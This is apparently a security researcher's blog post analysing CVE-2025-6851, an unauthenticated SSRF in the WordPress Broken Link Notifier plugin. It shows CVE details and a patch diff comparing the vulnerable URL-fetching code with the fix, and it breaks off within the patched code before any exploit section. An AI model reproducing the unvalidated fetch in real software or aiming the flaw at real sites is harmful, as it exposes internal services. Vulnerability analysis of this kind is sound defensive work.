<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>CVE-2025-6851 Analysis &amp; POC - Bui Van Y</title><meta name="author" content="Bui Van Y">
<meta name="description" content="Security Vulnerability in WordPress Broken Link Notifier Plugin."><meta name="keywords" content='analyst, plugin, ssrf'>
  <meta itemprop="name" content="CVE-2025-6851 Analysis & POC">
  <meta itemprop="description" content="Security Vulnerability in WordPress Broken Link Notifier Plugin.">
  <meta itemprop="datePublished" content="2025-10-28T19:00:00+07:00">
  <meta itemprop="dateModified" content="2025-10-27T21:42:17+07:00">
  <meta itemprop="wordCount" content="2553">
  <meta itemprop="image" content="http://localhost:1313/posts/2025-10-28-cve-2025-6851/app.png">
  <meta itemprop="keywords" content="Analyst,Plugin,Ssrf"><meta property="og:url" content="http://localhost:1313/posts/2025-10-28-cve-2025-6851/">
  <meta property="og:site_name" content="Bui Van Y">
  <meta property="og:title" content="CVE-2025-6851 Analysis & POC">
  <meta property="og:description" content="Security Vulnerability in WordPress Broken Link Notifier Plugin.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-10-28T19:00:00+07:00">
    <meta property="article:modified_time" content="2025-10-27T21:42:17+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Ssrf">
    <meta property="og:image" content="http://localhost:1313/posts/2025-10-28-cve-2025-6851/app.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/2025-10-28-cve-2025-6851/app.png">
  <meta name="twitter:title" content="CVE-2025-6851 Analysis & POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress Broken Link Notifier Plugin.">
<meta name="application-name" content="Bui Van Y">
<meta name="apple-mobile-web-app-title" content="Bui Van Y"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/svg-spinners--wind-toy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/2025-10-28-cve-2025-6851/" title="CVE-2025-6851 Analysis &amp; POC - Bui Van Y" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/2025-10-27-cve-2025-10861/" title="CVE-2025-10861 Analysis &amp; POC" /><link rel="next" type="text/html" href="http://localhost:1313/posts/2025-10-29-cve-2025-12136/" title="CVE-2025-12136 Analysis &amp; POC" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/2025-10-28-cve-2025-6851/index.md" title="CVE-2025-6851 Analysis & POC - Bui Van Y"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "CVE-2025-6851 Analysis \u0026 POC",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/posts\/2025-10-28-cve-2025-6851\/"
    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, plugin, ssrf","wordcount":  2553 ,
    "url": "http:\/\/localhost:1313\/posts\/2025-10-28-cve-2025-6851\/","datePublished": "2025-10-28T19:00:00+07:00","dateModified": "2025-10-27T21:42:17+07:00","publisher": {
      "@type": "Organization",
      "name": "/images/avatar.png","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
        "@type": "Person",
        "name": "Bui Van Y"
      },"description": "Security Vulnerability in WordPress Broken Link Notifier Plugin."
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="32" width="32"><span class="header-title-text">Bui Van Y</span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="Search titles or contents ..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li><li class="menu-item language-switch">
            <span role="button" aria-label="Select Language" title="Select Language"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
            <ul class="sub-menu"><li class="menu-item"><span class="text-secondary" title="English">English</span></li><li class="menu-item"><a href="/vi/posts/2025-10-28-cve-2025-6851/" class="menu-link" title="Vietnamese">Vietnamese</a></li></ul>
          </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="26" width="26"><span class="header-title-text">Bui Van Y</span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="Search titles or contents ..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              Cancel
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span><span class="menu-system-item language-switch">
              <span role="button" aria-label="Select Language" title="Select Language">English<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
              <select class="language-select" onchange="location = this.value;"><option value="/posts/2025-10-28-cve-2025-6851/" selected disabled>English</option><option value="/vi/posts/2025-10-28-cve-2025-6851/">Vietnamese</option></select>
            </span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"><div class="details related-details open">
      <div class="details-summary related-summary">
        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
        <span class="related-title">Related Content</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
      <div class="details-content related-content">
        <ul class="related-list"><li class="related-item">
              <a href="/posts/2025-11-02-cve-2025-1043/" title="CVE-2025-1043 Analysis &amp; POC">CVE-2025-1043 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-01-cve-2025-52713/" title="CVE-2025-52713 Analysis &amp; POC">CVE-2025-52713 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-10-31-cve-2025-60161/" title="CVE-2025-60161 Analysis &amp; POC">CVE-2025-60161 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-10-30-cve-2025-11128/" title="CVE-2025-11128 Analysis &amp; POC">CVE-2025-11128 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-10-29-cve-2025-12136/" title="CVE-2025-12136 Analysis &amp; POC">CVE-2025-12136 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-10-27-cve-2025-10861/" title="CVE-2025-10861 Analysis &amp; POC">CVE-2025-10861 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-10-23-cve-2023-36679/" title="CVE-2023-36679 Analysis &amp; POC">CVE-2023-36679 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-10-22-cve-2025-11361/" title="CVE-2025-11361 Analysis &amp; POC">CVE-2025-11361 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-10-21-cve-2025-32141/" title="CVE-2025-32141 Analysis &amp; POC">CVE-2025-32141 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-10-20-cve-2025-52716/" title="CVE-2025-52716 Analysis &amp; POC">CVE-2025-52716 Analysis &amp; POC</a></li></ul>
      </div>
    </div></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>CVE-2025-6851 Analysis &amp; POC</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Author" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/cve-analyst/" class="post-category" title="Category - CVE Analyst"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analyst</a></span></div><div class="post-meta-line"><span title="published on 2025-10-28 19:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-10-28">2025-10-28</time></span>&nbsp;<span title="Updated on 2025-10-27 21:42:17"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-10-27">2025-10-27</time></span>&nbsp;<span title="2553 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 2600 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>12 minutes</span>&nbsp;</div>
    </div><div class="featured-image"><img src='/posts/2025-10-28-cve-2025-6851/app.png' alt="/posts/2025-10-28-cve-2025-6851/app.png"></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#analysis">Analysis</a>
      <ul>
        <li><a href="#patch-diff">Patch diff</a></li>
        <li><a href="#vulnerable-code">Vulnerable Code</a></li>
        <li><a href="#flow">Flow</a></li>
      </ul>
    </li>
    <li><a href="#exploit">Exploit</a>
      <ul>
        <li><a href="#local-server">Local Server</a></li>
        <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#key-takeaways">Key takeaways</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h2 class="heading-element" id="cve--basic-info"><span>CVE &amp; Basic Info</span>
  <a href="#cve--basic-info" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>The <strong>Broken Link Notifier</strong> plugin for WordPress is vulnerable to <strong>Server‑Side Request Forgery</strong> in all versions up to and including <strong>1.3.0</strong> via the <code>ajax_blinks()</code> function which ultimately calls <code>check_url_status_code()</code>. This allows <strong>unauthenticated attackers</strong> to perform web requests to arbitrary addresses from the web application and can be used to query or modify information from internal services.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-6851"target="_blank" rel="external nofollow noopener noreferrer">CVE-2025-6851</a></li>
<li><strong>Vulnerability Type</strong>: Server Side Request Forgery (SSRF)</li>
<li><strong>Affected Versions</strong>: &lt;= 1.3.0</li>
<li><strong>Patched Versions</strong>: 1.3.1</li>
<li><strong>CVSS severity</strong>: Medium (7.2)</li>
<li><strong>Required Privilege</strong>: Unauthenticated</li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/broken-link-notifier/"target="_blank" rel="external nofollow noopener noreferrer">WordPress Broken Link Notifier Plugin</a></li>
</ul>
<h2 class="heading-element" id="requirements"><span>Requirements</span>
  <a href="#requirements" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><strong>Local WordPress &amp; Debugging</strong>: <a href="https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/"target="_blank" rel="external nofollow noopener noreferrer">Local WordPress and Debugging</a>.</li>
<li><strong>Plugin versions</strong> - <strong>Broken Link Notifier</strong>: <strong>1.3.0</strong> (vulnerable) and <strong>1.3.1</strong> (patched).</li>
<li><strong>Diff tool</strong> - <a href="https://meldmerge.org/"target="_blank" rel="external nofollow noopener noreferrer"><strong>Meld</strong></a> or any diff tool to inspect and compare differences between the two versions.</li>
</ul>
<h2 class="heading-element" id="analysis"><span>Analysis</span>
  <a href="#analysis" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 class="heading-element" id="patch-diff"><span>Patch diff</span>
  <a href="#patch-diff" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight" title="helpers.php - v1.3.0"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="hl"><span class="lnt"> 6
</span></span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="hl"><span class="lnt">11
</span></span><span class="lnt">12
</span><span class="hl"><span class="lnt">13
</span></span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">check_url_status_code</span><span class="p">(</span> <span class="nv">$url</span><span class="p">,</span> <span class="nv">$timeout</span> <span class="o">=</span> <span class="k">null</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Add the home url
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nx">str_starts_with</span><span class="p">(</span> <span class="nv">$url</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$link</span> <span class="o">=</span> <span class="nx">home_url</span><span class="p">()</span><span class="o">.</span><span class="nv">$url</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">        <span class="nv">$link</span> <span class="o">=</span> <span class="nv">$url</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Check the link
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>    <span class="nv">$response</span> <span class="o">=</span> <span class="nx">wp_remote_get</span><span class="p">(</span> <span class="nv">$link</span><span class="p">,</span> <span class="nv">$http_request_args</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nx">is_wp_error</span><span class="p">(</span> <span class="nv">$response</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">        <span class="nv">$code</span> <span class="o">=</span> <span class="nx">wp_remote_retrieve_response_code</span><span class="p">(</span> <span class="nv">$response</span> <span class="p">);</span>    
</span></span><span class="line"><span class="cl">        <span class="nv">$error</span> <span class="o">=</span> <span class="s1">&#39;Unknown&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$code</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$error</span> <span class="o">=</span> <span class="nv">$response</span><span class="o">-&gt;</span><span class="na">get_error_message</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="c1">// End check_url_status_code
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>In the vulnerable version, the <code>check_url_status_code()</code> function calls <code>wp_remote_get()</code> directly with the user-supplied URL without validating or checking the safety of the URL. This creates a <strong>SSRF (Server-Side Request Forgery)</strong> vulnerability. This version does not check the URL scheme, whether the host is valid, or whether the IP belongs to private/reserved ranges, so all requests are executed without restriction.</p>
<div class="highlight" title="helpers.php - v1.3.1"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="hl"><span class="lnt"> 6
</span></span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="hl"><span class="lnt"> 9
</span></span><span class="hl"><span class="lnt">10
</span></span><span class="hl"><span class="lnt">11
</span></span><span class="hl"><span class="lnt">12
</span></span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="hl"><span class="lnt">16
</span></span><span class="lnt">17
</span><span class="hl"><span class="lnt">18
</span></span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="hl"><span class="lnt">26
</span></span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">check_url_status_code</span><span class="p">(</span> <span class="nv">$url</span><span class="p">,</span> <span class="nv">$timeout</span> <span class="o">=</span> <span class="k">null</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Add the home url
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nx">str_starts_with</span><span class="p">(</span> <span class="nv">$url</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$link</span> <span class="o">=</span> <span class="nx">home_url</span><span class="p">()</span><span class="o">.</span><span class="nv">$url</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">        <span class="nv">$link</span> <span class="o">=</span> <span class="nv">$url</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Block SSRF to private/reserved ranges
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>    <span class="nv">$unsafe</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">is_url_unsafe</span><span class="p">(</span> <span class="nv">$link</span> <span class="p">);</span>
</span></span><span class="line hl"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nv">$unsafe</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">        <span class="k">return</span> <span class="nx">apply_filters</span><span class="p">(</span> <span class="s1">&#39;blnotifier_status&#39;</span><span class="p">,</span> <span class="nv">$unsafe</span> <span class="p">);</span>
</span></span><span class="line hl"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Check the link
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>    <span class="nv">$response</span> <span class="o">=</span> <span class="nx">wp_remote_get</span><span class="p">(</span> <span class="nv">$link</span><span class="p">,</span> <span class="nv">$http_request_args</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nx">is_wp_error</span><span class="p">(</span> <span class="nv">$response</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">        <span class="nv">$code</span> <span class="o">=</span> <span class="nx">wp_remote_retrieve_response_code</span><span class="p">(</span> <span class="nv">$response</span> <span class="p">);</span>    
</span></span><span class="line"><span class="cl">        <span class="nv">$error</span> <span class="o">=</span> <span class="s1">&#39;Unknown&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$code</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$error</span> <span class="o">=</span> <span class="nv">$response</span><span class="o">-&gt;</span><span class="na">get_error_message</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="c1">// End check_url_status_code
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line hl"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">is_url_unsafe</span><span class="p">(</span> <span class="nv">$url</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$parts</span> <span class="o">=</span> <span class="nx">wp_parse_url</span><span class="p">(</span> <span class="nv">$url</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$parts</span><span class="p">[</span> <span class="s1">&#39;scheme&#39;</span> <span class="p">],</span> <span class="nv">$parts</span><span class="p">[</span> <span class="s1">&#39;host&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;broken&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;code&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>
